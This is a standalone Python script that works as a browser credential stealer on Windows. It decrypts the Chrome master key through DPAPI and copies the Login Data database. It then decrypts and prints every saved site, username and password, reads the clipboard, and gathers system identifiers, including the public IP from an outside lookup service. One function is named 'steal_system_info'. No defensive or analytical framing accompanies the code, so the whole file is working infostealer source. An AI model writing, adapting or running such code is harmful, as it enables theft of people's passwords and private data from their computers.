import os, json, base64
from win32crypt import CryptUnprotectData

def get_decryption_key():
    path = os.path.join(os.environ["USERPROFILE"],
                        "AppData", "Local", "Google", "Chrome",
                        "User Data", "Local State")
    with open(path, "r", encoding="utf-8") as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
from Crypto.Cipher import AES

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        payload = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload).decode()
    except:
        try:
            return str(CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "Decryption Failed"
import shutil, sqlite3

def extract_browser_passwords():
    data_path = os.path.join(os.environ["USERPROFILE"],
                             "AppData", "Local", "Google", "Chrome",
                             "User Data", "Default", "Login Data")
    temp_path = "Loginvault.db"
    shutil.copy2(data_path, temp_path)

    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    key = get_decryption_key()

    for url, username, password in cursor.fetchall():
        decrypted_password = decrypt_password(password, key)
        print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")

    cursor.close()
    conn.close()
    os.remove(temp_path)
import pyperclip

def capture_clipboard():
    try:
        content = pyperclip.paste()
        print(f"Clipboard Data: {content}")
    except:
        print("Clipboard Access Failed")
import platform, socket, uuid, re, requests

def steal_system_info():
    try:
        system_info = {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Machine": platform.machine(),
            "Hostname": socket.gethostname(),
            "Private IP": socket.gethostbyname(socket.gethostname()),
            "MAC Address": ':'.join(re.findall("..", "%012x" % uuid.getnode()))
        }
        public_ip = requests.get("https://api.ipify.org?format=json").json()["ip"]
        system_info["Public IP"] = public_ip
        for key, value in system_info.items():
            print(f"{key}: {value}")
    except:
        print("System Info Fetch Failed")
if __name__ == "__main__":
    print("=== Extracting Chrome Passwords ===")
    extract_browser_passwords()
    print("\n=== Capturing Clipboard ===")
    capture_clipboard()
    print("\n=== System Info ===")
    steal_system_info()
